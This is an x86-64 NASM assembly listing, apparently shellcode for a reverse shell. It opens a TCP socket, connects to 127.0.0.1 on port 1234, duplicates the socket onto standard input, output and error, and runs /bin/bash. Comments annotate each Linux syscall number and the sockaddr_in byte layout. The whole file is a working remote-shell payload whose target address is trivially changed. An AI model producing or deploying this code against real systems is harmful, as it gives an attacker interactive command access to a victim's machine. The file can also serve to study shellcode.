bits 64

; asmlinkage long sys_socket(int domain, int type, int protocol);

	mov rdi, 2 ; AF_INET => PF_INET => 2 ;;; /usr/include/bits/socket.h
	mov rsi, 1 ; SOCK_STREAM => 1 ;;; /usr/include/bits/socket_type.h
	mov rdx, 0
	mov rax, 41
	syscall

	; now rax contains the fd

; asmlinkage long sys_connect(int fd, struct sockaddr __user *, int addrlen);

	mov rdi, rax ; fd
	lea rsi, [rel sockaddr] ; Socket address inet
	mov rdx, 16 ; sock_addr_in size
	mov rax, 42
	syscall

	; we are connected!

; asmlinkage long sys_dup2(unsigned int oldfd, unsigned int newfd);
	; check if rdi contains the fd
	mov rsi, 2
	mov rax, 33
	syscall
	mov rsi, 1
	mov rax, 33
	syscall
	mov rsi, 0
	mov rax, 33
	syscall

; int kernel_execve(const char *filename, const char *const argv[], const char *const envp[]);

	lea rdi, [rel filename]
  lea rsi, [rel args]
  mov rdx, 0

	mov [rel args], rdi
	mov [rel args+8], rdx

	mov rax, 59
	syscall
	jmp exit

filename db '/bin/bash',0
args times 2 dq 1

; struct sockaddr_in {
;     short            sin_family;
;     unsigned short   sin_port; // in network byte order (htons())
;     struct in_addr   sin_addr; // As 32 bit
;     char             sin_zero[8];
; };
sockaddr db 2,0,0x04,0xd2,0x7f,0x00,0x00,0x01,0,0,0,0,0,0,0,0

exit:
